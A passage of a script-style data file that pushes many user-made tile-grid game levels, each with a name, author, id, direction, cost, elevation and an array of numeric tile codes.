,1,1,11,66,66,8,8,66,11,11,66,66,11,11,11,11,11,11,11,18,18,1,11,66,66,8,8,66,5,66,66,66,66,66,66,11,15,13,11,18,18,1,11,66,66,8,8,66,66,66,66,66,66,66,66,10,15,13,11,18,18,1,11,66,66,9,9,92,66,66,66,66,66,66,66,9,16,16,51,18,2,1,11,66,66,9,9,92,66,5,5,5,5,5,5,9,16,16,51,18,2,1,11,3,5,66,66,66,66,66,66,66,66,66,66,10,15,13,11,18,18,1,11,5,66,66,66,66,66,66,66,66,66,66,66,11,15,13,11,18,94,1,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,11,18,18,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Find The Ring",author="Frid",id="#1664270432",direction="forward",cost=280,elevation=0,map=[1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,105,105,105,1,14,14,14,14,90,14,90,14,14,14,14,14,14,1,1,1,142,1,142,1,14,14,14,14,14,14,14,14,14,90,14,14,14,1,1,1,5,5,5,5,3,0,0,0,0,0,34,34,0,0,0,5,14,1,1,1,5,5,5,0,0,0,0,0,0,0,33,33,0,0,0,5,3,1,1,1,6,6,5,0,0,0,0,0,0,0,32,32,0,0,0,90,5,1,1,1,7,6,5,0,0,0,0,0,0,0,11,11,0,0,0,5,5,1,1,1,7,6,5,0,0,0,25,90,0,0,45,90,0,0,0,90,5,1,94,1,7,6,5,25,25,25,25,25,25,25,45,45,25,25,25,5,5,91,105,1,7,6,5,25,25,25,25,25,25,25,90,45,25,25,25,5,5,91,105,1,7,6,5,0,0,0,90,25,0,0,90,45,0,0,0,90,5,1,93,1,7,6,5,0,0,0,0,0,0,0,11,11,0,0,0,5,5,1,1,1,6,6,5,0,0,0,0,0,0,0,31,31,0,0,0,5,5,1,1,1,5,5,0,0,0,0,0,0,0,0,30,30,0,0,0,5,90,1,1,1,5,5,0,0,0,0,0,0,0,0,29,29,0,0,0,5,5,1,1,1,5,6,7,8,9,0,29,0,29,29,97,29,0,27,0,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,96,96,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,105,105,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,142,142,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1]});
maps.push({name="Get The Ring",author="Frid",id="#1664270465",direction="forward",cost=421,elevation=0,map=[1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,5,134,5,1,109,109,109,90,1,5,5,5,16,16,16,16,16,16,16,24,24,3,5,1,109,109,109,90,1,5,5,5,36,5,5,5,5,5,16,16,24,24,5,1,109,109,109,109,1,5,5,5,36,5,5,5,5,5,5,15,15,24,1,1,91,1,109,109,1,5,5,5,36,5,5,5,5,5,5,5,15,15,1,1,91,1,109,109,1,5,5,5,36,5,5,5,5,5,5,5,5,14,1,1,109,1,1,109,1,5,5,5,36,5,5,19,19,19,19,5,5,14,1,1,94,1,1,109,1,5,5,5,36,5,19,19,19,1,19,5,5,13,1,1,109,1,1,109,1,5,5,5,36,5,1,1,3,1,19,19,5,13,1,1,96,109,1,109,1,5,5,5,36,5,1,124,124,1,1,19,5,13,1,1,109,109,1,109,1,5,5,5,36,5,1,97,124,124,1,19,5,12,1,1,133,109,1,109,1,5,5,5,36,5,1,93,124,124,1,19,5,12,1,1,1,1,1,109,1,5,5,5,36,5,1,1,1,1,19,19,5,12,1,1,110,110,110,109,1,5,5,5,36,5,5,5,1,18,19,5,5,11,1,1,110,109,90,9,14,3,5,5,17,17,5,5,18,18,5,5,5,11,1,1,110,109,90,9,14,5,5,5,5,17,17,18,18,5,5,5,11,11,1,1,110,109,109,109,1,1,1,1,1,1,1,1,1,1,5,11,11,1,1,1,110,109,109,109,109,109,109,109,91,91,91,109,143,10,10,11,1,1,0,1,110,96,96,109,109,109,109,109,91,91,91,109,143,10,10,1,1,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0]});
maps.push({name="Cursed Ritual",author="Headhunterz",id="#1664320717",direction="right",cost=410,elevation=5,map=[6,2,2,6,12,12,15,14,14,14,12,12,15,15,144,1,1,1,1,1,6,6,6,12,12,94,14,17,90,17,14,14,12,15,7,7,1,1,1,1,7,6,6,12,12,14,17,17,17,17,17,14,14,15,15,7,12,12,19,1,90,6,6,12,15,14,87,20,20,20,20,87,17,15,15,7,12,12,111,2,5,6,7,12,15,17,17,17,24,20,24,17,14,14,15,7,12,12,111,2,7,6,6,12,90,14,14,15,20,20,20,90,14,14,15,7,12,12,19,1,7,6,6,12,14,14,17,15,20,100,20,20,19,14,15,6,12,12,12,1,5,6,6,12,15,14,20,16,20,20,20,20,19,87,15,6,12,12,12,1,7,6,7,12,14,14,17,16,16,17,17,18,18,14,15,6,12,12,12,1,7,6,7,12,15,14,14,20,24,20,24,20,20,14,15,5,12,12,12,1,85,6,7,12,12,12,14,14,17,17,17,15,15,14,5,5,12,12,12,1,5,6,6,6,12,87,12,14,14,13,13,13,12,46,46,46,12,12,12,1,6,6,7,7,90,12,12,12,12,12,10,9,9,5,5,5,12,12,12,1,5,6,6,7,6,6,6,7,7,6,6,6,6,6,5,5,1,112,112,1,6,6,6,6,7,7,6,6,6,6,6,6,6,6,6,6,1,111,111,1,5,6,7,6,6,7,7,7,6,6,85,6,6,12,12,1,1,110,110,1,5,6,6,6,6,6,6,6,7,7,6,7,7,47,47,107,108,109,109,1,6,6,6,6,7,6,6,8,7,6,6,6,7,47,47,107,108,109,109,1,94,6,6,90,6,7,7,6,6,6,7,6,6,12,12,1,1,1,1,1,7,7,5,5,89,7,6,7,6,6,7,6,6,12,93,1,1,1,1,1]});
maps.push({name="Trenches",author="sivi",id="#1664379979",direction="forward",cost=390,elevation=-4,map=[0,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,0,0,1,8,8,7,7,1,131,131,9,9,133,133,1,7,7,8,8,1,0,0,1,8,8,7,7,1,105,105,9,9,105,105,1,7,7,8,8,1,0,0,1,9,9,105,105,1,105,105,9,9,105,105,1,105,105,9,9,1,0,0,1,9,9,105,105,1,105,90,9,9,90,105,1,105,105,9,9,1,0,0,1,9,9,90,105,1,105,105,9,9,105,105,1,105,90,9,9,1,0,0,1,9,9,105,105,1,105,105,9,9,105,105,1,105,105,9,9,1,0,0,1,9,9,105,105,1,105,90,9,9,90,105,1,105,105,9,9,1,0,0,1,9,9,90,105,1,105,105,9,9,105,105,1,105,90,9,9,1,0,0,1,9,9,105,105,1,105,105,9,9,105,105,1,105,105,9,9,1,0,0,1,9,9,105,105,1,105,90,9,9,90,105,1,105,105,9,9,1,0,0,1,9,9,90,105,1,105,105,9,9,105,105,1,105,90,9,9,1,0,0,1,9,9,105,105,1,105,105,9,9,105,105,1,105,105,9,9,1,0,0,1,9,9,105,105,1,7,7,8,8,7,7,1,105,105,9,9,1,0,0,1,134,134,90,105,1,7,7,8,8,7,7,1,105,90,132,132,1,0,0,1,90,88,105,105,1,1,1,1,1,1,1,1,105,105,88,90,1,0,0,1,93,105,105,105,105,105,105,105,105,105,105,105,105,105,105,94,1,0,0,1,94,105,105,105,89,105,105,105,105,105,105,89,105,105,105,93,1,0,0,1,90,105,105,105,105,105,105,105,105,105,105,105,105,105,105,90,1,0,0,1,1,1,1,1,1,105,105,2,2,105,105,1,1,1,1,1,1,0]});
maps.push({name="Balins Tomb",author="sivi",id="#1664396438",direction="left",cost=231,elevation=4,map=[24,24,24,24,0,0,0,24,105,2,2,24,0,0,0,0,0,0,0,0,2,109,109,24,24,0,0,24,105,105,105,24,0,0,0,0,0,0,0,0,2,109,109,109,1,1,1,24,90,105,105,24,1,1,1,0,0,0,0,0,24,24,109,109,95,9,9,1,5,5,5,1,9,9,1,0,0,0,0,0,0,24,24,109,95,9,9,5,5,5,5,5,9,90,1,0,0,0,0,0,0,0,24,24,1,9,9,5,5,97,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,90,5,5,5,5,9,94,1,0,0,0,0,0,0,0,0,0,1,9,9,5,5,5,5,5,9,93,1,0,0,0,0,0,0,0,0,0,1,9,9,5,5,5,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,1,5,7,5,1,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,5,5,7,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,12,9,5,5,5,5,5,9,12,1,0,0,0,0,0,0,0,0,0,1,9,9,5,0,5,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,5,5,5,5,5,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,139,6,6,6,139,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,1,7,7,7,1,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,139,8,8,8,139,9,9,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,90,1,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="where is the ring",author="sivi",id="#1664413079",direction="left",cost=245,elevation=0,map=[5,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,5,5,5,1,132,0,0,0,0,134,0,0,0,0,137,1,0,0,0,0,5,5,5,1,25,0,0,0,0,31,0,0,0,0,28,1,0,0,0,0,5,5,5,1,25,0,0,0,0,31,0,0,0,0,28,1,0,0,0,0,131,133,136,1,25,0,24,24,24,11,0,0,0,0,28,1,0,0,0,0,1,1,1,1,25,0,24,24,24,11,0,0,0,0,93,1,0,0,0,0,0,0,0,1,25,0,0,24,24,11,0,0,0,28,28,1,0,0,0,0,0,0,0,1,93,0,0,0,0,31,0,0,28,28,0,1,0,0,0,0,0,0,0,1,25,0,0,0,0,11,0,0,28,0,0,1,1,1,1,1,0,0,0,1,25,25,0,0,0,31,31,0,28,28,0,0,8,9,138,1,0,0,0,1,0,25,25,0,0,0,31,0,0,28,28,28,8,9,138,1,0,0,0,1,24,24,25,25,0,0,93,0,0,27,0,0,0,0,0,1,0,0,0,1,24,24,24,25,25,0,31,0,0,26,0,0,0,0,0,1,0,0,0,1,24,24,24,0,25,25,45,25,25,25,25,25,25,25,138,1,0,0,0,1,1,24,24,0,0,0,31,0,0,0,0,0,0,0,0,1,0,0,0,0,1,1,24,0,11,11,11,11,11,0,0,0,0,0,0,1,0,0,0,0,0,1,1,1,12,1,12,12,11,11,0,0,0,0,0,1,2,5,5,5,5,5,139,1,12,94,90,12,12,11,0,0,11,11,138,1,2,5,5,5,5,5,139,1,12,12,12,12,12,11,86,31,11,11,138,1,5,5,5,5,5,5,5,1,1,1,1,1,1,1,1,1,1,1,1,1]});
maps.push({name="The Inevitable",author="Mini",id="#1664454747",direction="forward",cost=610,elevation=0,map=[0,144,144,144,144,0,0,0,0,2,2,0,0,0,0,144,144,144,144,0,0,144,144,100,9,9,9,9,0,6,6,0,9,9,9,9,100,144,144,0,0,144,144,144,144,0,9,9,8,7,7,8,9,9,0,144,144,144,144,0,0,144,144,144,0,0,0,9,8,8,8,8,9,0,0,0,144,144,144,0,0,144,144,0,0,0,9,9,0,0,0,0,9,9,0,0,0,144,144,0,0,144,0,0,0,10,10,0,0,144,144,0,0,10,10,0,0,0,144,0,0,0,0,0,95,95,0,0,144,144,144,144,0,0,95,95,0,0,0,0,0,0,0,11,11,0,0,144,144,144,144,144,144,0,0,11,11,0,0,0,0,0,12,12,0,0,144,144,144,144,144,144,144,144,0,0,12,12,0,0,0,13,13,0,0,144,144,144,144,94,93,144,144,144,144,0,0,13,13,0,0,13,13,0,0,144,144,144,144,93,94,144,144,144,144,0,0,13,13,0,0,0,12,12,0,0,144,144,144,144,144,144,144,144,0,0,12,12,0,0,0,0,0,11,11,0,0,144,144,144,144,144,144,0,0,11,11,0,0,0,0,0,0,0,95,95,0,0,144,144,144,144,0,0,95,95,0,0,0,0,0,144,0,0,0,10,10,0,0,144,144,0,0,10,10,0,0,0,144,0,0,144,144,0,0,0,9,9,0,0,0,0,9,9,0,0,0,144,144,0,0,144,144,144,0,0,0,9,8,8,8,8,9,0,0,0,144,144,144,0,0,144,144,144,144,0,9,9,8,7,7,8,9,9,0,144,144,144,144,0,0,144,144,100,91,9,9,9,0,6,6,0,9,9,9,91,100,144,144,0,0,144,144,144,144,0,0,0,0,2,2,0,0,0,0,144,144,144,144,0]});
maps.push({name="Moria is unstable",author="Frid",id="#1664456133",direction="forward",cost=197,elevation=-19,map=[1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,124,124,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,123,123,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,23,23,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,1,23,23,22,21,20,19,18,17,16,16,96,116,131,1,0,0,0,0,0,1,1,1,1,1,1,1,1,1,16,16,96,116,131,1,0,0,0,0,0,0,90,10,10,11,12,13,14,15,16,16,1,1,1,1,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,90,90,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,9,9,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,8,8,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,1,132,6,5,5,5,90,90,5,5,97,90,0,1,0,0,1,0,0,0,1,132,6,5,5,5,5,5,5,5,5,90,0,1,0,0,1,1,1,1,1,1,0,0,0,0,0,0,1,96,96,1,0,1,0,0,1,0,0,0,1,1,1,1,1,1,1,1,1,105,105,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,1,1,0,0]});
maps.push({name="real ending",author="sivi",id="#1664470491",direction="forward",cost=183,elevation=0,map=[0,0,0,0,0,0,0,0,5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,5,13,13,7,13,13,143,13,13,5,0,0,0,0,0,0,0,0,0,0,5,13,85,45,45,45,45,85,13,5,0,0,0,0,0,0,0,0,0,0,5,143,45,45,45,45,45,45,7,5,0,0,0,0,0,0,0,0,0,1,5,13,45,45,45,45,45,45,13,5,1,0,0,0,0,0,0,0,0,0,5,13,45,45,45,45,45,45,13,5,0,0,0,0,0,0,0,0,0,0,5,7,45,45,45,45,45,45,143,5,0,0,0,0,0,0,0,0,0,0,5,13,85,45,45,45,45,85,13,5,0,0,0,0,0,0,0,0,0,0,5,13,13,13,95,95,13,13,13,5,0,0,0,0,0,0,0,0,0,1,0,0,0,13,45,45,13,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,13,2,2,13,0,0,0,0,0,0,0,0]});
maps.push({name="half pipe",author="swarm",id="#1664472648",direction="left",cost=208,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,22,20,18,17,15,14,14,14,0,0,0,0,0,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,0,0,0,0,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,0,0,0,0,0,0,0,0,0,22,20,18,17,24,14,14,14,15,17,18,0,0,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,18,20,0,0,0,0,0,0,0,93,20,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,22,20,18,17,15,14,14,14,24,17,18,20,22,0,0,0,0,0,0,22,20,18,17,15,14,14,14,15,17,18,20,94,0,0,0,0,0,0,22,20,18,17,24,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,20,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,0,18,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,0,0,17,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,0,0,0,15,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,0,0,0,2,14,14,14,15,17,18,20,22,0,0,0,0,0,0,0,0,0,0,0,2,14,14,24,17,18,20,22,0,0,0,0,0,0,0,0,0,0,0,0,0,14,15,17,18,20,22,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Aquactive",author="Mini",id="#1664541781",direction="forward",cost=394,elevation=3,map=[0,0,0,0,0,0,0,0,6,2,2,6,0,0,0,0,0,0,0,0,0,0,0,0,0,6,6,6,6,6,6,6,6,6,6,0,0,0,0,0,0,0,0,0,0,6,94,6,6,6,90,6,6,94,6,0,0,0,0,0,0,0,0,0,0,90,7,85,0,0,0,0,7,85,7,0,0,0,0,0,0,0,0,0,0,7,7,7,0,0,0,0,7,7,7,0,0,0,0,0,0,0,0,0,0,85,8,90,0,0,0,0,8,85,8,0,0,0,0,0,0,0,0,0,0,8,8,8,0,0,0,0,8,90,8,0,0,0,0,0,12,12,12,11,11,10,90,10,9,9,9,9,10,10,10,11,85,12,12,90,90,12,85,90,11,10,10,10,9,141,141,9,10,10,90,11,11,12,12,12,1,72,1,1,72,1,0,23,23,23,23,23,23,0,1,72,1,1,72,1,1,72,1,1,72,1,0,0,23,43,43,90,0,0,1,72,1,1,72,1,1,72,1,1,72,1,0,0,0,43,43,0,0,0,1,72,1,1,72,1,1,72,1,1,72,1,0,0,0,43,0,0,0,0,1,72,1,1,72,1,1,72,1,1,72,1,0,0,0,0,0,0,0,0,1,72,1,1,72,1,1,72,1,1,72,1,0,0,0,67,67,0,0,0,1,72,1,1,72,1,1,72,1,1,72,1,1,90,85,66,66,9,90,1,1,72,1,1,72,1,1,72,1,1,74,74,66,9,9,9,9,9,9,66,73,73,1,1,72,1,1,72,1,1,1,1,1,9,9,85,9,9,90,1,1,1,1,1,72,1,1,74,74,74,74,74,66,9,9,90,85,9,9,66,73,73,73,73,73,1,1,1,1,1,1,1,1,90,9,2,2,9,85,1,1,1,1,1,1,1]});
maps.push({name="Fate",author="Mini",id="#1664545697",direction="forward",cost=414,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,67,67,31,31,0,0,0,0,0,31,31,31,31,31,0,0,0,0,67,67,95,31,90,29,31,0,89,0,31,90,29,90,31,31,0,0,0,67,100,95,31,85,29,29,67,67,31,67,67,27,27,29,31,0,0,0,67,95,95,31,29,29,67,67,67,67,67,67,67,67,27,29,31,0,0,0,31,29,29,29,67,67,67,31,31,31,31,31,29,29,27,29,31,31,0,0,31,90,29,29,67,31,67,31,29,29,29,29,90,31,27,27,29,31,0,0,0,31,67,67,67,31,67,31,31,31,85,65,29,29,85,27,27,90,31,0,0,0,0,0,31,67,0,0,0,0,0,0,65,31,31,0,27,29,31,0,0,89,31,0,31,67,0,0,44,44,44,0,0,0,0,0,0,31,0,0,0,0,0,0,31,67,0,100,44,92,44,94,0,67,31,0,0,0,0,0,0,31,0,0,0,0,0,0,44,44,44,0,0,67,31,0,31,89,0,0,31,29,27,0,31,31,65,0,0,0,0,0,0,67,31,0,0,0,0,0,0,90,27,27,85,29,29,65,85,31,31,31,67,31,67,67,67,31,0,0,0,31,29,27,27,90,31,29,29,29,29,31,67,31,67,29,29,29,90,0,0,0,31,29,27,29,29,31,31,32,31,31,67,67,67,90,29,29,31,0,0,0,31,90,90,27,67,67,67,67,67,67,67,29,29,31,95,95,67,0,0,31,31,31,29,29,31,67,31,67,67,29,29,85,31,95,100,67,0,0,0,31,31,31,90,31,0,0,89,0,31,29,90,31,95,67,67,0,0,0,0,2,2,0,0,0,0,0,0,0,0,31,31,67,67,0,0,0,0,0]});
maps.push({name="Trolley Valley",author="Mini",id="#1664547989",direction="forward",cost=213,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,1,1,0,0,0,0,1,1,1,0,0,0,5,5,5,5,0,0,1,1,0,0,1,1,1,1,0,0,0,1,0,0,5,5,5,5,0,1,0,0,1,0,0,0,1,0,1,0,0,1,0,0,91,91,91,91,0,1,0,0,1,1,1,0,1,1,1,0,0,1,0,0,144,91,95,91,0,1,0,0,1,1,0,1,1,0,1,0,0,1,0,0,86,91,91,144,0,1,0,0,0,0,0,1,1,1,1,0,0,1,0,0,91,91,91,91,0,1,0,0,1,0,1,0,1,0,1,0,0,1,0,0,95,91,86,91,0,1,0,0,1,0,0,0,1,1,1,0,0,1,0,0,91,91,91,91,0,1,0,0,1,1,0,0,1,0,1,0,1,0,0,0,91,91,91,91,0,1,0,0,1,1,0,1,0,1,0,0,1,0,0,0,91,91,91,91,0,1,0,0,0,0,0,1,1,0,0,1,0,0,0,0,144,91,95,86,0,1,0,0,0,1,0,1,0,0,0,1,0,0,0,0,91,91,91,91,0,1,0,0,0,1,1,0,0,0,1,0,0,0,0,0,91,95,144,91,0,0,1,1,0,0,1,1,0,1,0,0,0,0,0,0,86,91,91,95,0,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0]});
maps.push({name="Captain Planet",author="Mini",id="#1664554292",direction="forward",cost=420,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,77,77,0,0,0,0,0,0,14,14,0,0,0,1,1,1,1,0,0,77,77,1,1,1,1,0,0,0,14,14,0,0,1,1,1,1,1,1,1,77,80,86,76,34,76,1,0,0,14,14,1,1,1,142,1,91,91,100,1,77,76,80,80,76,76,1,0,0,14,14,14,14,1,114,91,142,1,91,1,100,14,75,76,80,34,114,14,14,14,14,14,14,114,114,91,1,1,142,1,14,14,75,76,80,86,114,14,14,14,14,1,14,114,114,114,91,91,114,1,77,80,76,80,76,80,1,0,0,14,14,1,1,1,1,1,1,142,1,1,77,76,34,80,34,76,1,0,0,14,14,0,1,1,91,91,114,91,91,1,1,1,1,1,1,1,0,0,0,14,14,0,0,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,94,14,14,93,0,0,67,67,67,0,0,0,0,92,0,0,0,0,0,0,0,14,14,0,0,67,1,1,1,1,1,0,0,0,0,92,0,0,0,0,0,14,14,0,67,1,72,73,66,70,66,1,0,19,1,1,0,92,0,0,34,14,14,67,67,1,72,1,66,1,66,1,19,19,100,1,0,0,0,34,0,34,14,14,14,114,66,1,70,1,70,1,19,19,19,1,0,0,0,34,34,0,14,14,14,114,66,1,66,1,66,1,0,19,1,1,0,92,0,0,34,14,14,67,67,1,70,1,70,1,66,1,0,0,0,92,0,0,0,0,0,14,14,0,67,1,66,70,66,1,100,1,0,92,0,0,0,0,0,0,0,14,14,0,0,67,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,67,67,67,0,0,0]});
maps.push({name="Guerilla Compound",author="sivi",id="#1664565485",direction="forward",cost=378,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,5,5,5,5,5,0,0,24,10,10,10,10,10,10,10,10,10,10,5,5,10,10,10,10,5,0,0,24,5,5,90,90,5,5,5,5,5,10,5,5,10,5,5,10,5,0,0,24,5,11,90,11,90,11,9,7,5,5,7,7,5,5,5,10,5,0,0,24,5,11,90,3,90,11,7,5,5,5,5,5,5,5,5,10,5,24,24,24,5,11,45,45,45,11,5,5,5,5,5,5,5,5,5,10,5,24,5,5,5,11,90,45,45,45,5,5,5,5,5,5,5,7,5,10,5,24,5,5,94,11,45,45,90,45,5,5,5,5,5,90,5,5,5,10,5,24,5,5,90,11,45,45,45,11,5,5,5,90,9,9,9,9,5,10,5,24,5,5,90,11,90,45,90,11,5,5,5,5,9,9,9,9,5,143,5,24,5,5,5,11,90,11,90,11,5,5,5,5,5,5,5,5,5,10,5,24,5,5,5,143,5,3,93,10,5,5,5,90,9,9,9,9,5,10,5,24,5,5,5,143,5,5,5,10,5,5,5,5,9,9,9,9,5,24,24,24,8,10,10,10,5,5,10,10,5,5,5,5,5,5,5,5,5,24,0,24,8,10,10,10,5,5,10,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,10,5,5,10,5,5,5,5,5,5,5,5,5,5,24,0,0,0,0,0,10,7,7,10,10,10,96,96,10,10,5,5,5,5,24,0,0,0,0,0,10,5,5,5,5,5,5,5,5,10,5,5,5,5,24,0,0,0,0,0,10,5,5,5,5,5,5,5,5,10,5,5,5,5,24,0,0,0,0,0,10,10,10,10,10,10,10,2,2,10,24,24,24,24,24,0]});
maps.push({name="Cliff Hideout",author="sivi",id="#1664565506",direction="forward",cost=167,elevation=8,map=[1,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,11,11,0,0,0,0,0,0,0,0,0,30,30,30,30,0,0,0,0,1,13,11,31,31,31,31,31,31,17,31,31,31,1,1,30,30,0,0,0,1,13,3,18,18,52,18,18,31,17,17,51,17,1,1,1,30,0,0,0,1,14,11,18,52,52,52,18,31,51,51,51,17,1,0,1,30,0,0,0,1,16,11,18,90,93,90,18,31,17,90,90,17,1,0,1,30,0,0,0,1,16,16,18,139,18,139,18,90,17,139,139,17,1,1,1,25,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,25,25,25,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,25,3,3,25,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,44,44,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,2,2,24]});
maps.push({name="Nick Cage",author="Asc3nded",id="#1664580828",direction="right",cost=230,elevation=0,map=[2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,1,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,24,86,1,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,86,24,1,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,24,86,1,17,17,0,19,19,19,0,0,0,0,0,0,0,0,17,17,0,86,24,1,17,17,0,20,20,20,0,0,0,0,0,1,0,0,17,17,0,24,24,1,1,17,0,21,21,21,0,0,0,0,0,1,1,1,17,17,0,24,94,24,39,3,0,21,93,21,0,0,0,0,0,0,0,1,141,141,1,24,24,24,39,38,0,20,93,21,0,0,0,0,0,0,0,0,24,24,24,24,24,24,39,38,0,20,93,21,130,130,130,130,130,130,130,130,130,24,2,24,24,24,39,38,0,20,93,21,130,130,130,130,130,130,130,130,130,24,2,24,24,24,39,38,0,20,93,21,0,0,0,0,0,0,0,0,24,24,24,24,94,24,39,3,0,21,93,21,0,0,0,0,0,0,0,1,141,141,1,1,1,1,1,17,0,21,21,21,0,0,0,0,0,1,1,1,17,17,0,0,0,0,17,17,0,20,20,20,0,0,0,0,0,1,0,0,17,17,0,0,0,0,17,17,0,19,19,19,0,0,0,0,0,0,0,0,17,17,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,17,17,0,0,0,0,0,0,0,0,0,0,0,0,17,17,0,0,0,0,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
